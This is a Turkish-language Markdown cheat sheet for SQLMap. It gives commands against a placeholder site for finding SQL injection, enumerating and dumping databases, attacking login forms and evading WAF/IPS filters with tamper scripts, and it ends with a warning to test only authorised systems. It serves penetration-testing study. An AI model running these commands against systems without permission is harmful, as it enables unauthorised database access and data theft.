```md
## 🛠️ SQLMap Kullanımı

**SQLMap**, SQL Injection zafiyetlerini tespit etmek ve veritabanı üzerinde veri çekmek için kullanılan güçlü bir otomatik araçtır.  

### 1️⃣ Temel Kullanım
- Hedef URL ile tarama:
```
sqlmap -u "http://hedef.com/index.php?id=1"
```
- Belirli parametreyi test etme:
```
sqlmap -u "http://hedef.com/index.php?id=1" -p id
```
- POST isteği ile test:
```
sqlmap -u "http://hedef.com/index.php" --data="username=admin&password=1234"
```
- Cookie ile test:
```
sqlmap -u "http://hedef.com/index.php?id=1" --cookie="PHPSESSID=12345"
```
- GET + POST + Cookie kombinasyonu:
```
sqlmap -u "http://hedef.com/search.php?q=test" --data="search=test" --cookie="PHPSESSID=abc123" --level=5 --risk=3
```

---

### 2️⃣ Veritabanı Hakkında Bilgi Alma
- Veritabanı sürümü ve banner:
```
sqlmap -u "http://hedef.com/index.php?id=1" --banner
```
- Mevcut kullanıcı:
```
sqlmap -u "http://hedef.com/index.php?id=1" --current-user
```
- Mevcut veritabanı:
```
sqlmap -u "http://hedef.com/index.php?id=1" --current-db
```
- Tüm veritabanlarını listeleme:
```
sqlmap -u "http://hedef.com/index.php?id=1" --dbs
```

---

### 3️⃣ Tablolar ve Kolonlar
- Tabloları listeleme:
```
sqlmap -u "http://hedef.com/index.php?id=1" -D veritabani_adi --tables
```
- Kolonları listeleme:
```
sqlmap -u "http://hedef.com/index.php?id=1" -D veritabani_adi -T tablo_adi --columns
```
- Belirli kolon verilerini çekme:
```
sqlmap -u "http://hedef.com/index.php?id=1" -D veritabani_adi -T tablo_adi -C kolon1,kolon2 --dump
```

---

### 4️⃣ Admin Panel ve Form Testleri
- Form üzerinden test (login bypass vb.):
```
sqlmap -u "http://hedef.com/login.php" --forms --batch --level=5 --risk=3
```
- Tüm parametreler otomatik test:
```
sqlmap -u "http://hedef.com/page.php" --crawl=2 --random-agent
```

---

### 5️⃣ WAF / IPS / Filtreli Siteler
- Bypass teknikleri:
```
sqlmap -u "http://hedef.com/index.php?id=1" --tamper=between,space2comment,randomcase --level=5 --risk=3
```
- Örnek tamper scriptleri:
  - `between.py` → Keyword parçalama
  - `randomcase.py` → Büyük/küçük harf karışımı
  - `space2comment.py` → Boşluk yerine yorum satırı

---

### 6️⃣ Çıktı ve Raporlama
- JSON formatında kayıt:
```
sqlmap -u "http://hedef.com/index.php?id=1" --batch --output-dir=./output --dump-format=json
```
- CSV veya HTML raporları:
```
sqlmap -u "http://hedef.com/index.php?id=1" --batch --dump-format=csv
sqlmap -u "http://hedef.com/index.php?id=1" --batch --dump-format=html
```

---

### 7️⃣ Özet Notlar
- **-u** : Hedef URL  
- **-p** : Test edilecek parametre  
- **--data** : POST verisi  
- **--cookie** : Cookie bilgisi  
- **--dbs / --tables / --columns / --dump** : Veri çekme  
- **--level / --risk** : Tarama derinliği ve risk seviyesi  
- **--tamper** : WAF/IPS bypass  
- **--batch** : Tüm soruları otomatik cevaplar  

> SQLMap kullanırken dikkat: Her zaman izinli sistemlerde test yap. Yetkisiz erişim **yasadışıdır**.
```
